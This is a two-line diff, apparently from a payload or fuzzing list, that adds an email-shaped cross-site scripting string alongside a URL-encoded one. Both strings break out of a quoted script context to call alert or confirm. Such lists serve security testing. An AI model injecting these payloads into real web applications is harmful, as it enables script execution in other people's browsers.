@@ -1,1 +1,2 @@
 %27%29%3bconfirm%28%271
+["');alert('XSS');//"]@xyz.xxx
